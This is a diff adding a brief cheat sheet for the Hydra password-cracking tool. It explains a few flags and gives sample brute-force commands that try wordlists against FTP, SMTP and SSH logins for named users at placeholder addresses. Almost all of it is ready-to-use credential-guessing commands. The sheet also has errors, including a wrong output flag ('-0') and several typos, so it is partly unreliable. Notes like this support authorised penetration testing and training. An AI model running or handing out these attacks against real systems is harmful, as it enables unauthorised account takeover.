@@ -1,0 +1,24 @@
+#hydra does not have a native default wordlist, using the Rockyou list is suggested
+
+#example brute force crack on ftp server
+
+:: Params ::
+
+-t # = preform # tasks
+-l NAME = try to log in with NAME
+-P [filepath] = Try password
+-vV = verbose mode, showing the login+pass for each attempt
+
+#check for joe accounts by adding modifier -e s
+
+#to write found login+pass combinations to fiel, add modifier -0 [fileanme]
+
+:: Sintax :: hydra -L users.txt -P passwords.txt <host> <protocol|service>
+
+:: Samples ::
+
+- hydra -t 1 -l admin -P [path to password.lst] -vV [IPaddress] ftp
+- hydra -l ksanchez -P [path to wordlist] smtp://10.0.0.10
+- hydra -l ksanchez -e nsr [IP] ssh -V -f
+- hydra -l ksanchez -P /root/wordlist/rockyour.lst 10.0.0.10 ssh
+- hydra -L dict.txt -P wordlist.lst [IP] ssh
